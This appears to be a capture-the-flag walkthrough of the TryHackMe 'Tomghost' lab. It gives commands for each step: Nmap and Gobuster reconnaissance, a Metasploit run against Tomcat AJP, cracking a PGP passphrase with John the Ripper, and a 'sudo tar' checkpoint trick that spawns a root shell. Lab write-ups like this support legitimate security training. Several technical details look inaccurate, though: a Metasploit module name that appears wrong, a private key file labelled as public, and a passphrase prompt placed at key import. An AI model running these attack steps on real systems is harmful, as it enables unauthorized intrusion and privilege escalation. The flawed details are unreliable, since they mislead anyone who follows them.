# TryHackMe: Tomghost Walkthrough

## Reconnaissance
The first step in this challenge is reconnaissance, which involves gathering information about the target system to identify potential vulnerabilities.

### Nmap Scan
We begin by using **Nmap**, a powerful network scanning tool, to identify open ports and services on the target machine. The command used might look like this:
```bash
nmap -sV -A <target-ip>
```
This scan reveals that ports **8009** and **8080** are open:
- **Port 8009**: Typically used by the **Apache JServ Protocol (AJP)**, often in conjunction with **Apache Tomcat**.
- **Port 8080**: Often used for web applications, commonly serving Apache Tomcat's web management interface.

### Gobuster Scan
Next, we perform a directory brute-force scan using **Gobuster** to find hidden directories on the web server hosted on port 8080:
```bash
gobuster dir -u http://<target-ip>:8080 -w /usr/share/wordlists/dirb/common.txt
```
This helps identify web application endpoints that might be vulnerable or interesting.

### Exploiting Apache Tomcat AJP
Using **Metasploit (msfconsole)**, we search for known vulnerabilities related to Apache Tomcat AJP on port 8009:
```bash
search tomcat ajp
```
We find a suitable exploit (e.g., `exploit/multi/http/tomcat_ajp_upload_bypass`), configure it with:
```bash
use exploit/multi/http/tomcat_ajp_upload_bypass
set RHOST <target-ip>
set RPORT 8009
run
```
Running this exploit gives us access to a credential file or shell, revealing a **username and password** pair. These credentials can then be used to gain shell access via **SSH**.

## Decrypting Files
After gaining access, we find two files:
- `credential.pgp` (encrypted file)
- `tryhackme.asc` (public key file)

We transfer both files to our local machine for decryption.

### Importing the Public Key
We use **GnuPG (gpg)** to handle the encryption and decryption. First, we import the `.asc` file:
```bash
gpg --import tryhackme.asc
```
The import prompts for a **passphrase**, which we do not yet have.

### Cracking the Passphrase with John the Ripper
To recover the passphrase, we use **John the Ripper**, a password cracking tool. First, we use `gpg2john` to convert the `.asc` file into a hash John can understand:
```bash
gpg2john tryhackme.asc > hash
```
Then we run John with a commonly used wordlist (e.g., rockyou.txt):
```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```
To display the cracked passphrase:
```bash
john hash --show
```

### Decrypting the PGP File
Once the passphrase is retrieved, we import the `.asc` file again if needed:
```bash
gpg --import tryhackme.asc
```
Now, we decrypt the encrypted `credential.pgp` file:
```bash
gpg --decrypt credential.pgp
```
This reveals **Merlin's credentials**, which can be used to switch users:
```bash
su - merlin
```

## Privilege Escalation
As Merlin, we check for sudo privileges:
```bash
sudo -l
```
If we find permitted commands or binaries, we use **GTFOBins**, a curated list of Unix binaries that can be exploited by attackers to bypass local security restrictions, for privilege escalation. For example, if we see `tar` listed as a permitted command:
```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
This spawns a root shell, allowing us to fully compromise the target system, and locate the flag.

---
